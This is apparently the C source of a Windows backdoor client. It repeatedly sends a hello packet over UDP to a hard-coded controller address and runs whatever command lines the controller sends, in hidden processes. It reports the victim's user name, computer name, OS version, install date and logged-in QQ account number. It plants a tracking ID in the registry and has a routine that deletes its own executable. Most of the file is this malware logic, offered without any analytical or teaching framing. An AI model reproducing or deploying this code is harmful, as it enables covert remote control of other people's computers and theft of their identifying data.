#define _WIN32_WINNT 0x0501
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <winsock2.h>
#include <stdint.h>
//#define UNIT_TEST
#define CLIENT_ADDRESS "172.18.30.193"

typedef unsigned long long int QWORD ;
QWORD g_uid;

enum {
    RQ_COMMAND=1,
    RQ_HOSTINFO,
    RQ_SETUID,
    RQ_UNINSTALL,
    RQ_HELLO = 255
};

#pragma pack(push,1)
struct userinfo{
    wchar_t username[16];
    wchar_t hostname[16];
    char hardaddr[6];
    char drcomID[12];
    uint16_t os_ver;
    uint32_t sysSetupTime;
    char OICQID[12];
};

typedef struct userinfo HOSTINFO;

struct hostaddr{
    char ipaddr[4];
    uint16_t port;
};

typedef struct hostaddr HOSTADDR;


struct hellopkg {
    uint32_t randval;
    char id;
    char uid[8];
};

struct requestpkg {
    uint32_t randval;
    char id;
    char data[0];
};

struct responsepkg {
    uint32_t randval;
    char id;
    char data[0];
};
#pragma pack(pop)
/*
BOOL RegWrite(LPCWSTR szPath,LPCWSTR szKey,) {
    HKEY hKey = NULL;
    DWORD dwRet;
    DWORD dwAccess = KEY_READ;
    WCHAR szUniqueIDPath[MAX_PATH]=
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
    if(IsWow64())
        dwAccess |= 0x0100;//KEY_WOW64_64KEY
    hi->sysSetupTime = 0;
    dwRet = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  szUniqueIDPath,
                  0,
                  dwAccess,
                  &hKey);

    if(hKey) {
        DWORD dwDate;
        DWORD dwDateSize = sizeof(DWORD);
        DWORD dwKeyType = REG_DWORD;

        dwDate = 0;
        dwRet = RegQueryValueExW(hKey,
                                 L"InstallDate",
                                 NULL,
                                 &dwKeyType,
                                 (LPBYTE)&dwDate,
                                 &dwDateSize);
        hi->sysSetupTime = dwRet ? 0 : (uint32_t)dwDate;
        RegCloseKey(hKey);

    }
}

BOOL RegRead() {

}
*/
VOID DeleteMySelf(void)
{
    TCHAR szModule [MAX_PATH],
          szComspec[MAX_PATH],
          szParams [MAX_PATH];

    if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
       (GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
       (GetEnvironmentVariable(TEXT("COMSPEC"),szComspec,MAX_PATH)!=0))
    {
        lstrcpy(szParams,TEXT(" /c (for /l %i in (1,1,100) do echo.>nul )&del "));
        lstrcat(szParams, szModule);
        lstrcat(szParams, TEXT(" > nul"));
        lstrcat(szComspec, szParams);

        STARTUPINFO si={0};
        si.cb = sizeof(STARTUPINFO);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi;
        memset(&pi, 0, sizeof pi);
        SetPriorityClass(GetCurrentProcess(),
                REALTIME_PRIORITY_CLASS);
        SetThreadPriority(GetCurrentThread(),
            THREAD_PRIORITY_TIME_CRITICAL);

        if(CreateProcess(NULL, szComspec, NULL, FALSE, 0,CREATE_SUSPENDED |
                    CREATE_NO_WINDOW, 0, 0, &si, &pi))
        {
            SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
                        SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);
            ResumeThread(pi.hThread);
        }
        else
        {
            SetPriorityClass(GetCurrentProcess(),
                             NORMAL_PRIORITY_CLASS);
            SetThreadPriority(GetCurrentThread(),
                              THREAD_PRIORITY_NORMAL);
        }
    }
    int r = TerminateProcess(GetCurrentProcess(),0);
    printf("r = %d\n",r);
    return;
}


void GetUniqueID(QWORD *lpUID) {
    int i,n;
    srand(time(NULL));
    n = rand() % 65535;
    for(i = 0; i < n; i++) rand();
    for(i = 0; i < sizeof(QWORD); i++) {
        int n = rand()%256;
        ((BYTE*)lpUID)[i] = n;
    }
    HKEY hKey = NULL;
    DWORD dwRet;
    DWORD dwAccess = KEY_READ|KEY_WRITE;

    WCHAR szUniqueIDPath[MAX_PATH]=
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
    dwRet = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  szUniqueIDPath,
                  0,
                  dwAccess,
                  &hKey);

    if(hKey) {
        DWORD dwDate;
        QWORD qwUniqueID = 0;
        DWORD dwDateSize = sizeof(qwUniqueID);
        DWORD dwKeyType = REG_QWORD;
        dwRet = RegQueryValueExW(hKey,
                                 L"UniqueID",
                                 NULL,
                                 &dwKeyType,
                                 (LPBYTE)&qwUniqueID,
                                 &dwDateSize);
        if(dwRet == ERROR_SUCCESS) {
            *lpUID = qwUniqueID;
        } else if(dwRet == ERROR_FILE_NOT_FOUND) {
            dwRet = RegSetValueExW(hKey,
                                   L"UniqueID",
                                   NULL,
                                   REG_QWORD,
                                   (LPBYTE)lpUID,
                                   sizeof(QWORD));
        } else {
        }
        //printf("uid = %016llX\n",*lpUID);
        RegCloseKey(hKey);

    }
}

void init() {
    GetUniqueID(&g_uid);
    /*******************************************************/
    /*******************************************************/

}

BOOL IsWow64()
{
    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process;
    BOOL bIsWow64 = FALSE;
    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( GetModuleHandle((L"kernel32")), "IsWow64Process");
    if (NULL != fnIsWow64Process)
        fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
    return bIsWow64;
}

void binprint(unsigned char * bin,size_t size) {
    int i;
    putchar('\n');
    for(i = 0; i < size; i++) {
        printf("%02hhX",(unsigned char)bin[i]);
    }
    putchar('\n');
    for(i = 0; i < size; i++) {
        printf("%c",bin[i] < 128? bin[i] == 0? '.' : bin[i] : '~');
    }
    putchar('\n');

}

/**
 * @brief GetFirstOicqID Get first found OICQ ID Logon in current session
 * @param lpOicqID Pointer OICQ ID number
 * @return PID
 */
DWORD GetFirstOicqID(LPSTR lpOicqID){
    HWND hWin;
    CHAR strText[MAX_PATH]={0};
    WCHAR strClass[MAX_PATH];

    hWin = FindWindowW(L"CTXOPConntion_Class", NULL);
    if (hWin == 0) return 1;
    do
    {
          GetWindowTextA(hWin, strText, sizeof(strText));
          if(!strncmp(strText, "OP_",3))
          {
              DWORD pid;
              GetWindowThreadProcessId(hWin,&pid);
              //printf("%-11s %-6d\n",strText+3,pid);
              lstrcpyA(lpOicqID,strText+3);
              return pid;
          }
          do
          {
                  hWin = GetWindow(hWin, GW_HWNDNEXT);
                  if(hWin == 0 )break;
                  GetClassName(hWin, strClass, sizeof(strClass));
          }while (lstrcmp(strClass,TEXT("CTXOPConntion_Class")));
    }while (hWin);
    return 0;
}
/*
void GetHostUniqueID(LPSTR lpUniqueID)
{
    memcpy(lpUniqueID,g_uid,sizeof(g_uid));
}
*/
void GetClientAddress(LPSTR lpAddress)
{

}
/**
 * @brief ExecuteCommandLine
 * @param szCmdLine
 * @param lpPID
 * @return 0 is succeed
 */
DWORD ExecuteCommandLine(LPWSTR szCmdLine,LPDWORD lpPID) {
    //SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof si);
    si.cb = sizeof(STARTUPINFOW);
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    if(!CreateProcessW(NULL,szCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        return GetLastError();
    } else {
        *lpPID = pi.dwProcessId;
        return 0;
    }
}

/**
 * @brief GetHostInformation
 * @param hi
 */
void GetHostInformation(HOSTINFO *hi) {
    DWORD dwSize;
    dwSize = sizeof(hi->username);
    GetUserNameW(hi->username,&dwSize);
    dwSize = sizeof(hi->hostname);
    GetComputerNameW(hi->hostname,&dwSize);
    OSVERSIONINFOEXW ovi;
    ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
    GetVersionExW((LPOSVERSIONINFOW)&ovi);
    hi->os_ver=MAKEWORD(ovi.dwMajorVersion,ovi.dwMinorVersion);
    HKEY hKey = NULL;
    DWORD dwRet;
    DWORD dwAccess = KEY_READ;
    WCHAR szInstallDatePath[MAX_PATH]=
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
    if(IsWow64())
        dwAccess |= 0x0100;//KEY_WOW64_64KEY
    hi->sysSetupTime = 0;
    dwRet = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  szInstallDatePath,
                  0,
                  dwAccess,
                  &hKey);
    if(hKey) {
        DWORD dwDate;
        DWORD dwDateSize = sizeof(DWORD);
        DWORD dwKeyType = REG_DWORD;

        dwDate = 0;
        dwRet = RegQueryValueExW(hKey,
                                 L"InstallDate",
                                 NULL,
                                 &dwKeyType,
                                 (LPBYTE)&dwDate,
                                 &dwDateSize);
        hi->sysSetupTime = dwRet ? 0 : (uint32_t)dwDate;
        RegCloseKey(hKey);
    } else {
        hi->sysSetupTime = 0;
    }
    if(GetFirstOicqID(hi->OICQID) == 0) {
        strcpy(hi->OICQID,"NULL");
    }
    strcpy(hi->drcomID,"unsupport");
    memcpy(hi->hardaddr,"\x00\x00\x00\x00\x00\x00",6);


}

DWORD WINAPI ExecuteThread(LPVOID lpParam) {

}

#ifndef UNIT_TEST
int main(int argc, char *argv[])
{
    init();
    WSADATA wsaData = {0};
    if(WSAStartup(MAKEWORD(2,2),&wsaData) != 0) {
        return -1;
    }
    SOCKET sockClient = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
    if(sockClient == INVALID_SOCKET)
    {
        return -1;
    }
    SOCKADDR_IN addrClient = {0};
    HOSTENT *hostEntry;
    hostEntry = gethostbyname(CLIENT_ADDRESS);
    addrClient.sin_addr.s_addr = *(u_long*)hostEntry->h_addr_list[0];
    printf("addr = %s\n",inet_ntoa(addrClient.sin_addr));
    addrClient.sin_port = htons(8888);
    addrClient.sin_family = AF_INET;

    while(connect(sockClient,(SOCKADDR*)&addrClient,sizeof(addrClient)) == SOCKET_ERROR) {
        printf("connect error %d",WSAGetLastError());
        Sleep(1000);
    }

    DWORD dwTimeout = 1000*10;
    setsockopt(sockClient,SOL_SOCKET,SO_RCVTIMEO,(char *)&dwTimeout,sizeof(dwTimeout));
    for(;;) {
        puts("enter for");
        int ret,i,j,k;
        char szSendBuf[1024];
        char szRecvBuf[1024];
        int randval = rand();
        printf("Rand value: %d\n",randval);
        int nRead,nWrite;
        struct hellopkg * hello;
        struct requestpkg *request;
        struct responsepkg *response;
        hello = szSendBuf;
        hello->randval = randval;
        hello->id = 0xFF;
        memcpy(hello->uid,&g_uid,sizeof(g_uid));
        nWrite = sizeof(struct hellopkg);
        ret = send(sockClient,szSendBuf,nWrite,0);
        if(ret == SOCKET_ERROR) {
            puts("send error 1");
            break;
        }
        for(;;) {
            puts("enter enter for");
            request = szRecvBuf;
            response = szSendBuf;
            nRead = 0;
            nWrite = 0;
            ret = recv(sockClient,szRecvBuf,sizeof(szRecvBuf),0);
            if(ret == SOCKET_ERROR) {

                printf("recv error %lu\n",GetLastError());
                break;
                //if(WSAGetLastError() == WSAETIMEDOUT) {
                //    break;
                //}
                //if(WSAGetLastError() != WSAECONNRESET)
                //    break;
            }
            if(request->randval != randval) {
                printf("Randval error %d\n",request->randval);
                continue;
            }

            switch(request->id) {
            case RQ_COMMAND: {
                printf("id = command,length = %d\n",ret);
                int n;
                WCHAR szCommandLine[260];
                DWORD dwPID;
                DWORD dwCmdLIneSize = ret - sizeof(struct requestpkg);
                DWORD dwError;
                memcpy(szCommandLine,request->data,dwCmdLIneSize);
                szCommandLine[259] = '\0';
                printf("cmdline: %ls\n",szCommandLine);
                binprint((unsigned char *)szCommandLine,dwCmdLIneSize);
                if((dwError = ExecuteCommandLine(szCommandLine,&dwPID))) {
                    n = wsprintfW(response->data,L"ERROR:%d",dwError);
                } else {
                    n = wsprintfW(response->data,L"PID:%d",dwPID);
                }
                nWrite += (n + 1) * 2;
                break;
            }
            case RQ_HOSTINFO: {
                printf("id = hostinfo,length = %d\n",ret);
                HOSTINFO *ui;
                ui = (HOSTINFO*)response->data;

                GetHostInformation(ui);
                nWrite += sizeof(HOSTINFO);
                break;
            }
            case RQ_SETUID: {
                printf("id = setuid,length = %d\n",ret);
                break;
            }
            case RQ_UNINSTALL: {
                printf("id = uninstall,length = %d\n",ret);
                break;
            }
            default:
                printf("Unknow proto id %d\n",request->id);
            }

            response->id = request->id;
            response->randval = randval;
            nWrite += sizeof(struct responsepkg);
            ret = send(sockClient,szSendBuf,nWrite,0);
            if(ret == SOCKET_ERROR) {
                break;
            }
        }
        Sleep(5000);
    }
    WSACleanup();
    return 0;
}
#else
int main() {
    /* GetHostInformation Function Test*/
    {
        HOSTINFO ui;
        GetHostInformation(&ui);
        printf("drid:%s\nhname:%ls\n%OS:%hX\nQQ:%s\nsysdate:%X\nuname:%ls\n",
               ui.drcomID,
               ui.hostname,
               ui.os_ver,
               ui.OICQID,
               ui.sysSetupTime,
               ui.username);
        puts("-");
    }
    /* GetOicqID Function Test*/
    {
        CHAR szOicqID[15];
        DWORD dwPID;
        dwPID = GetFirstOicqID(szOicqID);
        if(dwPID)
            printf("QQID:%s\nPID:%d\n",szOicqID,dwPID);
        else
            puts("QQ not found");
        puts("-");

    }
    /* init*/
    {
        //init();
        QWORD uid;
        GetUniqueID(&uid);
        printf("uid = %016hhX\n",uid);
        puts("-");
    }
    getchar();
}
#endif
